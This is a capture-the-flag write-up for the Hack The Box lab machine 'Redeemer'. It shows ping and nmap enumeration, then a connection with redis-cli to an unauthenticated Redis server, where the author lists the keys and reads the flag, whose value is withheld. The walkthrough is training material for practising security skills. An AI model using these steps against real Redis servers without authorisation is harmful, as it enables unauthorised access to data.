# [Redeemer](https://app.hackthebox.com/starting-point)

## Target IP - 10.129.224.31

### Enumeration

Here we are checking if we are able to establish a connection with the target machine. In conclusion we are able to establish a connection between our lab with the target.

**Command 1** -

`ping 10.129.224.31`

**Output** -

```
PING 10.129.224.31 (10.129.224.31) 56(84) bytes of data.
64 bytes from 10.129.224.31: icmp_seq=1 ttl=62 time=231 ms
64 bytes from 10.129.224.31: icmp_seq=2 ttl=62 time=2451 ms
64 bytes from 10.129.224.31: icmp_seq=3 ttl=62 time=1669 ms
64 bytes from 10.129.224.31: icmp_seq=4 ttl=62 time=629 ms
64 bytes from 10.129.224.31: icmp_seq=5 ttl=62 time=233 ms
^C
--- 10.129.224.31 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4092ms
rtt min/avg/max/mdev = 231.025/1042.565/2451.337/878.880 ms, pipe 3
```

Here we are scanning the target machine for the open ports or services. In conclusion we find out that there is service named as redis on port 6379/tcp. Now we can try accessing the redis database. 

**Command 2** -

`nmap -sV 10.129.224.31 -p 6200-6400`

**Output** -

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 13:40 IST
Nmap scan report for 10.129.224.31
Host is up (0.56s latency).
Not shown: 200 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.05 seconds
```

### Foothold

Now we tried to access the redis database on the target machine using the redis-cli and finally got the access to the database.

**Command 3** -

`redis-cli -h 10.129.224.31`

**Output** -

`10.129.224.31:6379> `

Using the info command to find out the all information about the database. In conclusion we got the information of the database and also got to now that there are 4 keys present on the database.

**Command 4** -

`info`

**Output** -

```
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:749
run_id:8dbc9546e46d5a9958f01003694825effe8903d6
tcp_port:6379
uptime_in_seconds:1432
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:10014471
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:4
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5754880
used_memory_rss_human:5.49M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1590168
allocator_active:1937408
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.22
allocator_frag_bytes:347240
allocator_rss_ratio:4.73
allocator_rss_bytes:7221248
rss_overhead_ratio:0.63
rss_overhead_bytes:-3403776
mem_fragmentation_ratio:7.04
mem_fragmentation_bytes:4937264
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1721289972
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:417792
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:7
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:320
total_net_output_bytes:14869
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:227
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:3060ca832a136b1d0e361dd687a5de8942fee07e
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.914337
used_cpu_user:0.581574
used_cpu_sys_children:0.001011
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(0.81s)
```

Here we are running the command to find out all the keys present in the database and find out the flag key which is the final flag of the target machine.

**Command 5** - 

`keys *`

**Output** -

```
1) "stor"
2) "numb"
3) "flag"
4) "temp"
```

Accessing the flag key using the get command.

**Command 6** -

`get flag`

**Output** -

`"the flag digits (won't tell you ^_^)"`


### This machine has been pawned.

~goobar07
